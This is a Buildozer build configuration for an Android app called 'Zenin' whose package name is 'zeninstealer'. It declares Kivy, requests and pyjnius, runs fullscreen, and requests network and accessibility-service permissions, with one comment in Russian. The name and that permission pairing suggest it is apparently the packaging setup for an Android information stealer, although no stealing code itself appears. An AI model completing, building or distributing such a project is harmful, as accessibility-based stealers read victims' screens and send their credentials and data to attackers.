[app]
title = Zenin
package.name = zeninstealer
package.domain = org.anonim
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,mp4
version = 2.26

# Добавлен openssl (нужен для requests)
requirements = python3,kivy==2.3.0,requests,openssl,plyer,android,pyjnius

orientation = portrait
fullscreen = 1
android.permissions = INTERNET, BIND_ACCESSIBILITY_SERVICE
android.api = 31
android.minapi = 21
android.ndk = 25b
android.accept_sdk_license = True
android.archs = arm64-v8a

[buildozer]
log_level = 2
warn_on_root = 1
